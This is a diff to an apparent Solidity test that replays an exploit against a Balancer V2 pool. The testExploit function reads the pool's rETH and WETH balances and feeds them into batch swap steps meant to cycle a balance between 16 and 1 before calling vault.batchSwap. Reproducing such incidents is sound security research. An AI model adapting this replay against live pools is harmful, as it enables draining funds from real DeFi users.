@@ -58,11 +58,6 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
 
     /* 入口：打印攻击前余额 */
     function testExploit() public balanceLog{
-        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps();
-        address[] memory assets = _buildAssets();
-        IBalancerVault.FundManagement memory funds = _buildFunds();
-        int256[] memory limits = _buildLimits();
-
         (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock) = vault.getPoolTokens(POOL_ID);
 
         console.log("tokens: ");
@@ -74,6 +69,18 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
             console.log("[%s]:", i, balances[i]);
         }
         console.log("lastChangeBlock: ", lastChangeBlock);
+
+
+        uint256 bal_rETH0 = balances[0]; // 目标是让它在 16 - 1 之间来回swap
+        uint256 bal_WETH0 = balances[1];
+
+
+        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps(bal_rETH0, bal_WETH0);
+        address[] memory assets = _buildAssets();
+        IBalancerVault.FundManagement memory funds = _buildFunds();
+        int256[] memory limits = _buildLimits();
+
+
 
 
         int256[] memory assetDeltas = vault.batchSwap(
@@ -90,9 +97,7 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
         console.logInt(assetDeltas[1]);
     }
 
-    function _buildSwaps() internal pure returns (IBalancerVault.BatchSwapStep[] memory) {
-        uint256 bal_rETH0 = 3966690186101283013904; // 目标是让它在 16 - 1 之间来回swap
-        uint256 bal_WETH0 = 4382479526955180045671;
+    function _buildSwaps(uint256 bal_rETH0, uint256 bal_WETH0) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {
 
         IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](10);
 
